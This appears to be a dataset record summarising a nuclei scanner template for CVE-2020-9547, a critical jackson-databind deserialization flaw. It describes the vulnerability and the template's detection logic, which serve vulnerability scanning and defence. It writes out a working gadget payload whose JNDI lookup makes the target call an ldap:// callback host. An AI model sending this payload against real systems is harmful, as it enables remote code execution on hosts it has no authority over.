---
cve_id: CVE-2020-9547
template_path: nuclei-templates/http/cves/2020/CVE-2020-9547.yaml
affected_product: FasterXML jackson-databind
severity: critical
authentication: none
external_callback: true
affected_versions: 2.x before 2.9.10.4
preconditions: ['polymorphic type handling (@JsonTypeInfo with use=JsonTypeInfo.Id.CLASS) enabled']
poc_classification: rce
---

## Vulnerability
FasterXML jackson-databind 2.x (before 2.9.10.4) contains a deserialization flaw (CWE-502) in the interaction between serialization gadgets and typing. The gadget `com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig` (ibatis-sqlmap) can be triggered when an application enables polymorphic type handling via `@JsonTypeInfo(use=JsonTypeInfo.Id.CLASS)` and deserializes untrusted JSON data.  
CVSS 3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).  
Successful exploitation yields arbitrary code execution on the host running the affected Jackson deserializer.

## PoC / Detection
Classification: rce  
The template issues one unauthenticated POST request to `/` with `Content-Type: application/json` containing the gadget payload `["com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",{"properties":["java.util.Properties",{"UserTransaction":"ldap://{{interactsh-url}}/{{randstr}}"}]}]`. Detection succeeds on (1) an interactsh DNS callback confirming JNDI resolution or (2) Jackson exception strings (`JsonMappingException`, `InvalidTypeIdException`, `JdbcRowSetImpl`, `com.fasterxml.jackson.databind`, `javax.naming.NamingException`) appearing in the response body when status is 200/400/500.

## References
- https://github.com/fairyming/CVE-2020-9547
- https://github.com/FasterXML/jackson-databind/issues/2620
- https://nvd.nist.gov/vuln/detail/CVE-2020-9547
